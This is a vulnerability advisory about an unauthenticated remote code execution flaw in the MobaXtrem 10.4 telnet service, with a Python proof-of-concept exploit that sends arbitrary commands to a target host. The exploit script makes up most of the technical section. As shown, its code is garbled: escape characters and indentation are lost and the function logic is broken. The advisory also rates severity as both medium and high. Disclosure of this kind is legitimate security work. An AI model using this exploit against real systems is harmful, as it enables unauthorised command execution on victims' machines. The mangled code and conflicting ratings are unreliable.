Abstract Advisory Information:
==============================
An independent vulnerability laboratory researcher discovered a remote code execution vulnerability in the official MobaXtrem v10.4 software.
Vulnerability Disclosure Timeline:
==================================
2017-09-18: Public Disclosure (Vulnerability Laboratory)
Discovery Status:
=================
Published
Affected Product(s):
====================
Mobatek
Product: MobaXtrem - Software 10.4
Exploitation Technique:
=======================
Remote
Severity Level:
===============
Medium
Technical Details & Description:
================================
A remote code execution vulnerability has been discovered in the official MobaXtrem v10.4 software.
The vulnerability allows remote attackers to unauthorized execute malicious codes to compromise the targeted computer system.
Telnet service doesn't authenticate for a remote conncection which allows attacker to pass malicious commands over
victims computer system through the basic protocol.
Proof of Concept (PoC):
=======================
The vulnerability can be exploited by local and remote attackers without user interaction or privileged user accounts.
For security demonstration or to reproduce the vulnerability follow the provided information and steps below to continue.
import telnetlib,sys
print """
Exploit => MobaXtrem 10.4 Remote Code Execution
Discoverer => Sultan Albalawi
"""
def get\_set(HOST,cmd):
try :
tn = telnetlib.Telnet(HOST)
bg="x63x79x67x73x74x61x72x74"
tn.write(bg+" ./"+cmd+"n")
tn.write(main())
tn.read\_all()
except KeyboardInterrupt:
print "[-] Execution stopped ... keyboard interrupt raised"
except Exception as e:
pass
def main():
if len(sys.argv)==2:
HOST = sys.argv[1]
cmd = str(raw\_input("cmd> "))
if "exit" in cmd :
sys.exit("exiting...")
else:
print"Executing => %s"%cmd
get\_set(HOST,cmd)
else:
print "Usage: ./"+sys.argv[0]+" "
if \_\_name\_\_ == '\_\_main\_\_':
main()
Security Risk:
==============
The security risk of the remote code execution vulnerability in the software is estimated as high (CVSS).
